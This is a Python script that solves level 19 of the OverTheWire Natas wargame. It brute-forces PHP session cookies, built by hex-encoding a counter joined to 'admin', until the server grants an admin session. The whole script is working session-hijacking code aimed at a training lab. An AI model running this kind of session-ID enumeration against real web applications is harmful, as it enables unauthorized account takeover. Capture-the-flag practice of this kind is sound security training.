import requests


pathToDir = 'C:\\Users\\niroj\\Documents\\Natas\\'
userName = "natas19"
url = "http://natas19.natas.labs.overthewire.org/"
password = open(pathToDir + 'password.txt', 'r').readlines()[18][8:40]
print(password)


# -------------------------- First page ----------------------------

response = requests.get(url, auth = (userName, password))
htmlDoc = response.text

try:
    with open(pathToDir + "scripts\\temp\\index.html", 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("(+) first page is stored successfully on the path as index.html")
except IOError as err:
    print(f"(-) unfortunately {err}")


# ---------------------------- source index file -------------------------------

response = requests.get(url + 'index-source.html', auth = (userName, password))
htmlDoc = response.text

try:
    with open(pathToDir + "scripts\\temp\\index-source.html", 'w') as htmlSourceContent:
        htmlSourceContent.writelines(htmlDoc)
        print("(+) first page is stored successfully on the path as index-source.html")
except IOError as err:
    print(f"(-) unfortunately {err}")

# -------------------------------- Final Page -------------------------------------

for sessionID in range(1,640):
    valueInString = str(sessionID) + '-' + 'admin'
    value = valueInString.encode('utf-8').hex()
    # print(value)
    cookie = {
        # 'PHPSESSID': str(sessionID)
        'PHPSESSID': str(value)
        
    }
    
    # data = {
    #     'username': 'admin',
    #     'password': 'subscribe',
    #     'submit': 'Login'
    # }
    response = requests.post(url, auth = (userName, password), cookies = cookie)
    htmlDoc = response.text
    
    # cookie = response.cookies.get_dict
    
    # print(cookie)

    if ("You are an admin" in htmlDoc):
        print("(+) Here we are! ", sessionID, value)

        try:  
            with open(pathToDir + "scripts\\temp\\result.html", 'w') as htmlContent:
                htmlContent.writelines(htmlDoc)
                print("(+) first page is stored successfully on the path as result.html")
        except IOError as err:
            print(f"(-) unfortunately {err}")
        break

    else:
        print("(*) Trying ",sessionID ,value)
    